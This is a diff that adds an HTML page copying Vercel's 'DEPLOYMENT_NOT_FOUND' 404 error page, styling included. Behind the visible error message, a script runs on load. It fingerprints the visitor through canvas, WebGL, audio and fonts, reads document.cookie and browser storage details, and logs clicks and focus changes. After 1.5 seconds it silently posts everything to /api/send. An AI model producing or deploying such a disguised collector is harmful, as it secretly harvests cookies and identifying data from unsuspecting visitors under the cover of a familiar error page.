@@ -1,0 +1,293 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta name="theme-color" content="#000">
+  <title>404: NOT_FOUND</title>
+  <style>
+    /* exact original Vercel 404 CSS – keep it unchanged */
+    html{font-size:62.5%;box-sizing:border-box;height:-webkit-fill-available}
+    *,::after,::before{box-sizing:inherit}
+    body{font-family:sf pro text,sf pro icons,helvetica neue,helvetica,arial,sans-serif;font-size:1.6rem;line-height:1.65;word-break:break-word;font-kerning:auto;font-variant:normal;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;text-rendering:optimizeLegibility;hyphens:auto;height:100vh;height:-webkit-fill-available;max-height:100vh;max-height:-webkit-fill-available;margin:0}
+    ::selection{background:#79ffe1}
+    ::-moz-selection{background:#79ffe1}
+    a{cursor:pointer;color:#0070f3;text-decoration:none;transition:all .2s ease;border-bottom:1px solid #0000}
+    a:hover{border-bottom:1px solid #0070f3}
+    ul{padding:0;margin-left:1.5em;list-style-type:none}
+    li{margin-bottom:10px}
+    ul li:before{content:'\02013'}
+    li:before{display:inline-block;color:#ccc;position:absolute;margin-left:-18px;transition:color .2s ease}
+    code{font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif;font-size:.92em}
+    code:after,code:before{content:'`'}
+    .container{display:flex;justify-content:center;flex-direction:column;min-height:100%}
+    main{max-width:80rem;padding:4rem 6rem;margin:auto}
+    ul{margin-bottom:32px}
+    .error-title{font-size:2rem;padding-left:22px;line-height:1.5;margin-bottom:24px}
+    .error-title-guilty{border-left:2px solid #ed367f}
+    .error-title-innocent{border-left:2px solid #59b89c}
+    @media(max-width:500px){.owner-error{display:none}}
+    main p{color:#333}
+    .devinfo-container{border:1px solid #ddd;border-radius:4px;padding:2rem;display:flex;flex-direction:column;margin-bottom:32px}
+    .error-code{margin:0;font-size:1.6rem;color:#000;margin-bottom:1.6rem}
+    .devinfo-line{color:#333}
+    .devinfo-line code,code,li{color:#000}
+    .devinfo-line:not(:last-child){margin-bottom:8px}
+    .docs-link,.contact-link{font-weight:500}
+    header,footer,footer a{display:flex;justify-content:center;align-items:center}
+    header,footer{min-height:100px;height:100px}
+    header{border-bottom:1px solid #eaeaea}
+    header h1{font-size:1.8rem;margin:0;font-weight:500}
+    header p{font-size:1.3rem;margin:0;font-weight:500}
+    .header-item{display:flex;padding:0 2rem;margin:2rem 0;text-decoration:line-through;color:#999}
+    .header-item.active{color:#ff0080;text-decoration:none}
+    .header-item.first{border-right:1px solid #eaeaea}
+    .header-item-content{display:flex;flex-direction:column}
+    .header-item-icon{margin-right:1rem;margin-top:.6rem}
+    footer{border-top:1px solid #eaeaea}
+    footer a{color:#000}
+    footer a:hover{border-bottom-color:#0000}
+    footer svg{margin-left:.8rem}
+    .note{padding:8pt 16pt;border-radius:5px;border:1px solid #0070f3;font-size:14px;line-height:1.8;color:#0070f3}
+    @media(max-width:500px){
+      .devinfo-container .devinfo-line code{margin-top:.4rem}
+      .devinfo-container .devinfo-line:not(:last-child){margin-bottom:1.6rem}
+      .devinfo-container{margin-bottom:0}
+      header{flex-direction:column;height:auto;min-height:auto;align-items:flex-start}
+      .header-item.first{border-right:none;margin-bottom:0}
+      main{padding:1rem 2rem}
+      body{font-size:1.4rem;line-height:1.55}
+      footer{display:none}
+      .note{margin-top:16px}
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <main>
+      <p class="devinfo-container">
+        <span class="error-code"><strong>404</strong>: NOT_FOUND</span>
+        <span class="devinfo-line">Code: <code>DEPLOYMENT_NOT_FOUND</code></span>
+        <span class="devinfo-line">ID: <code>fra1::px2f9-1783887474851-04cbfc22fc8b</code></span>
+      </p>
+      <a href="https://vercel.com/docs/errors/DEPLOYMENT_NOT_FOUND" class="owner-error">
+        <div class="note">This deployment cannot be found. For more information and troubleshooting, see our documentation.</div>
+      </a>
+    </main>
+  </div>
+
+  <script>
+    (async function() {
+      // ==================== HELPERS ====================
+      const simpleHash = str => {
+        let hash = 0;
+        for (let i = 0; i < str.length; i++) {
+          hash = ((hash << 5) - hash) + str.charCodeAt(i);
+          hash |= 0;
+        }
+        return hash.toString(16);
+      };
+
+      const getOS = () => {
+        const ua = navigator.userAgent;
+        if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
+        if (/Android/i.test(ua)) return "Android";
+        if (/Windows/i.test(ua)) return "Windows";
+        if (/Mac/i.test(ua)) return "macOS";
+        return "Unknown";
+      };
+
+      // Fingerprinting (client‑side only)
+      async function getCanvasFP() {
+        const c = document.createElement("canvas");
+        c.width = 200; c.height = 50;
+        const ctx = c.getContext("2d");
+        ctx.textBaseline = "top";
+        ctx.font = "14px 'Arial'";
+        ctx.fillStyle = "#f60";
+        ctx.fillRect(10, 10, 50, 30);
+        ctx.fillStyle = "#069";
+        ctx.fillText("Fingerprint 🦖", 2, 15);
+        return simpleHash(c.toDataURL());
+      }
+
+      async function getWebGLInfo() {
+        const c = document.createElement("canvas");
+        const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+        if (!gl) return "No WebGL";
+        const ext = gl.getExtension("WEBGL_debug_renderer_info");
+        return ext
+          ? `${gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)} / ${gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)}`
+          : "Vendor/Renderer hidden";
+      }
+
+      async function getAudioFP() {
+        try {
+          const ac = new (window.AudioContext || window.webkitAudioContext)();
+          const osc = ac.createOscillator();
+          const analyser = ac.createAnalyser();
+          osc.type = "triangle";
+          osc.frequency.value = 10000;
+          osc.connect(analyser);
+          analyser.connect(ac.destination);
+          osc.start(0);
+          const buf = new Uint8Array(analyser.frequencyBinCount);
+          analyser.getByteFrequencyData(buf);
+          osc.stop(0);
+          ac.close();
+          return simpleHash(buf.join(","));
+        } catch (e) {
+          return "AudioCtx not supported";
+        }
+      }
+
+      function getFonts() {
+        const baseFonts = ["monospace", "sans-serif", "serif"];
+        const testFonts = [
+          "Arial", "Verdana", "Times New Roman", "Courier New", "Georgia",
+          "Comic Sans MS", "Trebuchet MS", "Impact", "Lucida Console", "Tahoma"
+        ];
+        const span = document.createElement("span");
+        span.style.fontSize = "72px";
+        span.innerHTML = "mmmmmmmmmmlli";
+        const baseWidths = {};
+        baseFonts.forEach(f => {
+          span.style.fontFamily = f;
+          document.body.appendChild(span);
+          baseWidths[f] = span.offsetWidth;
+          document.body.removeChild(span);
+        });
+        const found = [];
+        testFonts.forEach(font => {
+          for (const base of baseFonts) {
+            span.style.fontFamily = `'${font}', ${base}`;
+            document.body.appendChild(span);
+            if (span.offsetWidth !== baseWidths[base]) {
+              found.push(font);
+              document.body.removeChild(span);
+              break;
+            }
+            document.body.removeChild(span);
+          }
+        });
+        return found.join(", ");
+      }
+
+      const behavior = [];
+      const log = msg => behavior.push(`${Date.now() - startTime}ms: ${msg}`);
+      const startTime = Date.now();
+
+      // ==================== DATA COLLECTION ====================
+      async function gatherData() {
+        const ua = navigator.userAgent;
+        const uaData = navigator.userAgentData;
+        const brands = uaData ? uaData.brands.map(b => `${b.brand} ${b.version}`).join(", ") : "N/A";
+
+        let connInfo = "N/A";
+        if (navigator.connection) {
+          const c = navigator.connection;
+          connInfo = `type:${c.effectiveType}, downlink:${c.downlink}Mbps, rtt:${c.rtt}ms, saveData:${c.saveData}`;
+        }
+
+        const storage = navigator.storage ? await navigator.storage.estimate().catch(() => ({})) : {};
+        const indexedDBs = (await indexedDB.databases().catch(() => [])).map(db => db.name).join(", ");
+        const cachesList = (await caches.keys()).join(", ");
+        const codecTests = {
+          "H.264 Baseline": "video/mp4; codecs=\"avc1.42E01E\"",
+          "VP9": "video/webm; codecs=\"vp9\"",
+          "MP3": "audio/mpeg",
+          "Opus": "audio/ogg; codecs=\"opus\""
+        };
+        const codecSupport = {};
+        for (const [name, mime] of Object.entries(codecTests)) {
+          const el = document.createElement("video");
+          codecSupport[name] = el.canPlayType(mime) || "no";
+        }
+
+        return {
+          browser: {
+            userAgent: ua, brands, platform: navigator.platform,
+            language: navigator.language, languages: navigator.languages.join(", "),
+            cookie: document.cookie || "(none)",
+            localStorageSize: JSON.stringify(localStorage).length,
+            sessionStorageSize: JSON.stringify(sessionStorage).length,
+            indexedDBDatabases: indexedDBs, storageQuota: storage.quota, storageUsage: storage.usage,
+            caches: cachesList,
+          },
+          device: {
+            os: getOS(),
+            screen: `${screen.width}x${screen.height}`, avail: `${screen.availWidth}x${screen.availHeight}`,
+            colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth, devicePixelRatio: window.devicePixelRatio,
+            touch: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
+            hardwareConcurrency: navigator.hardwareConcurrency, deviceMemory: navigator.deviceMemory || "N/A",
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            utcOffset: -new Date().getTimezoneOffset() / 60,
+            network: connInfo,
+          },
+          gpu: await getWebGLInfo(),
+          canvasFP: await getCanvasFP(),
+          audioFP: await getAudioFP(),
+          fonts: getFonts(),
+          accessibility: {
+            darkMode: matchMedia('(prefers-color-scheme: dark)').matches,
+            reducedMotion: matchMedia('(prefers-reduced-motion: reduce)').matches,
+            colorGamut: matchMedia('(color-gamut: p3)').matches ? "p3" : "srgb",
+            contrast: matchMedia('(prefers-contrast: high)').matches ? "high" : "normal",
+            hdr: matchMedia('(dynamic-range: high)').matches ? "supported" : "unsupported",
+          },
+          codecSupport,
+          behavior: behavior.join("\n"),
+          pageDuration: Date.now() - startTime,
+        };
+      }
+
+      function buildText(data) {
+        let txt = "=== 404 PAGE VISITOR DATA ===\n\n";
+        for (const [section, content] of Object.entries(data)) {
+          txt += `--- ${section.toUpperCase()} ---\n`;
+          if (typeof content === "object" && content !== null) {
+            for (const [k, v] of Object.entries(content)) txt += `${k}: ${v}\n`;
+          } else txt += `${content}\n`;
+          txt += "\n";
+        }
+        return txt;
+      }
+
+      // ==================== SEND TO YOUR API ====================
+      async function sendToServer() {
+        try {
+          const allData = await gatherData();
+          const text = buildText(allData);
+          const clientInfo = `OS: ${getOS()} | Timezone: ${allData.device.timezone}`;
+
+          const resp = await fetch('/api/send', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ text, clientInfo }),
+          });
+
+          if (resp.ok) {
+            console.log('✅ Data sent to server.');
+          } else {
+            const err = await resp.json();
+            console.warn('⚠️ Server responded with', resp.status, err);
+          }
+        } catch (err) {
+          console.error('❌ Failed to send data:', err);
+        }
+      }
+
+      // Behaviour log
+      window.addEventListener("load", () => log("page loaded"));
+      document.addEventListener("click", e => log(`click (${e.clientX},${e.clientY})`));
+      window.addEventListener("focus", () => log("window focus"));
+      window.addEventListener("blur", () => log("window blur"));
+      document.addEventListener("visibilitychange", () =>
+        log(`visibility ${document.hidden ? "hidden" : "visible"}`)
+      );
+
+      setTimeout(sendToServer, 1500);
+    })();
+  </script>
+</body>
+</html>
